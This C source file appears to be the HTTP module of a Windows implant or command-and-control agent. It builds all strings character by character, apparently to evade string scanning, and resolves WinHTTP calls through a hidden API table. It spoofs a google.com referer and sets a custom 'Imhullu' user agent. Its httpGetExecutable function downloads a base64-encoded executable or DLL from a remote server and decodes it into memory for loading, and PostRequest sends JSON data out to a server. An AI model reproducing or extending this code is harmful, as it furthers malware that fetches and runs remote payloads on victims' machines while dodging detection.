#include "../include/http.h"

#define WINHTTP_ACCESS_TYPE_NO_PROXY 1
#define WINHTTP_FLAG_REFRESH 0x00000100

/*
This function sends a get request to a web server

Input:
    PAPI api: a pointer to the API structure
    WCHAR* wcServer: host name or an IP address of an HTTP server
    INTERNET_PORT port: port number
    WCHAR* wcPath: path to query
Output:
    Success -> CHAR*: web server response, needs to be freed
    Failure -> NULL
*/
CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
    // use google.com as the referer
    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
    WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    // open an http session
    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    // connect to the web server
    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wcServer,
        port,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    // open/craft a request
    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wcPath,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
    (
        hRequest,
        NULL,
        0,
        NULL,
        0,
        0,
        0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    // receive a response
    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    // notice this is the number in `Content-Length: 28375`. The number is returned as a string, not an int.
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwBufferLength,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer to store the content length string
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        // write the content length string into lpContentLength
        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLength,
            &dwBufferLength,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    DWORD dwBufferSize = 0;

    if (result)
    {
        // store the lpContentLength in dwBufferSize as an int
        dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    // allocate the buffer to store the response
    CHAR* cpBuffer = (CHAR*)((CALLOC)api->calloc)((size_t)(dwBufferSize), (size_t)sizeof(WCHAR));
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
    BOOL readSuccess = FALSE;

    // get the amount of data, in bytes, available to be read with WinHttpReadData
    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
    {
        // read the available data
        // write the data to the current index in cpBuffer
        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (LPVOID)(cpBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );

        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR))
        { break; }

        // modify the index in cpBuffer to write the next data to
        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (readSuccess)
    { return cpBuffer; }
    return NULL;
}

/*
This function sends a post request to an endpoint

Input:
    PAPI api: a pointer to the API struct
    WCHAR* server: a hostname or an IP address
    INTERNET_PORT port: a port number
    const WCHAR endpoint: a path on the server
    CCHAR* data: a json data
Output:
    The function returns nothing
*/
void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CCHAR* data)
{
    LPSTR pszData = (LPSTR)data;
    BOOL bResults = FALSE;

    WCHAR wVerb[] = { 'P', 'O', 'S', 'T', 0 };
    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
    WCHAR contentType[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0 };

    // open an http session
    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    if (hSession)
    {
        // specify an HTTP server
        HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);

        if (hConnect) {
            // create an HTTP request
            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
            (
                hConnect,
                wVerb,
                endpoint,
                wVersion,
                wReferer,
                NULL,
                WINHTTP_FLAG_REFRESH
            );

            if (hRequest)
            {
                // send the request
                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
                (
                    hRequest,
                    contentType,
                    0,
                    (LPVOID)pszData,
                    myStrlenA(pszData),
                    myStrlenA(pszData),
                    0
                );

                // Wait for the response
                if (bResults)
                { bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL); }
            }
            ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
        }
        ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    }
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
}

// TODO: combine this function with GetRequest
/*
the return need to be freed
*/
LPVOID httpGetExecutable(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServer, INTERNET_PORT dwPort)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wServer,
        dwPort,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wEndpoint,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLengthBuffer = NULL;
    DWORD dwContentLengthSize = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwContentLengthSize,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLengthBuffer= ((MALLOC)api->malloc)(dwContentLengthSize/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLengthBuffer,
            &dwContentLengthSize,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    DWORD dwEncodedExecutableSize = 0;
    if (result)
    {
        dwEncodedExecutableSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLengthBuffer);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedExecutableSize), (size_t)sizeof(WCHAR));
    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
    DWORD dwBytesRead = 0;
    DWORD dwAvailableBytes = 0;
    DWORD dwActuallyRead = 0;
  
    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &dwAvailableBytes) && dwAvailableBytes != 0 )
    {
        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (WCHAR*)lpEncodedBuffer+dwBytesRead,
            dwAvailableBytes,
            &dwActuallyRead
        );

        if (!readSuccess)
        {
            #ifdef DEBUG
            CHAR whrdFailed[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 'F' };
            ((MESSAGEBOXA)api->MessageBoxA)(-1, whrdFailed, whrdFailed, 0x0L);
            #endif
        }

        // Check for buffer overflow risk
        if (dwBytesRead + (dwAvailableBytes / sizeof(WCHAR)) > dwEncodedExecutableSize / sizeof(WCHAR))
        { break; }

        dwBytesRead += dwAvailableBytes/sizeof(WCHAR);
    }

    *pdwDllSize = base64_raw_size(dwEncodedExecutableSize);
    LPVOID lpRawExecutableBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));

    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
        lpEncodedBuffer,
        dwEncodedExecutableSize,
        0x000000001,
        lpRawExecutableBuffer,
        pdwDllSize,
        NULL,
        NULL
    );

    ((FREE)api->free)(lpEncodedBuffer);
    ((FREE)api->free)(lpContentLengthBuffer);

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (lpRawExecutableBuffer != NULL && lengthBuffer)
    { return lpRawExecutableBuffer; }
    else
    { return NULL;}
}
